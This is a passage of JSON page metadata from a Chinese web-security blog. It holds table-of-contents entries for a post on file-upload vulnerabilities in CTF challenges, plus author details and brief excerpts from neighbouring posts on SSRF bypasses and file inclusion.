href=\"#%E9%A2%98%E5%9E%8B%E6%96%B0%E9%A2%96%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">题型新颖的文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%8E%E5%8F%8D%E5%BC%B9shell%E7%BB%93%E5%90%88%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88MRCTF%E7%AD%BE%E5%88%B0%EF%BC%89\"><span class=\"toc-text\">与反弹shell结合的文件上传（MRCTF签到）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%93%E5%90%88SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88%E7%BD%91%E5%88%83%E6%9D%AFupload%EF%BC%89\"><span class=\"toc-text\">结合SQL注入的文件上传（网刃杯upload）</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B0%BE%E8%AE%B0\"><span class=\"toc-text\">尾记</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从一文中了解SSRF的各种绕过姿势及攻击思路","uid":"5fdc9b0e6b2ac7fe212943a2f6d06f72","slug":"从一文了解SSRF的各种绕过姿势及攻击思路","date":"2022-07-04T04:04:10.000Z","updated":"2023-03-14T08:05:34.000Z","comments":true,"path":"api/articles/从一文了解SSRF的各种绕过姿势及攻击思路.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141513830.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1648/ 前言SSRF之前只有简单了解，进行二次学习后简单总结一下，希望能对正在学习SSRF的师傅们有所帮助 漏洞相关信息漏洞成因SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"SSRF","slug":"SSRF","count":1,"path":"api/tags/SSRF.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析文件包含","uid":"778d53d2750c08bc5c3164d03f2d66cf","slug":"浅析文件包含","date":"2022-06-18T09:25:28.000Z","updated":"2024-02-14T07:55:42.000Z","comments":true,"path":"api/articles/浅析文件包含.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141555978.png","text":"前言近期发现文件包含这方面几乎一窍不通，特来对此漏洞进行学习，并总结如下，希望能对正在学习文件包含的人有些许帮助。 漏洞相关信息漏洞成因后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用此文件即可，该过程也就 被称为文件包含。文件包含的存在使得开发变得更加灵活...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"文件包含","slug":"文件包含","count":1,"path":"api/tags/文件包含.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}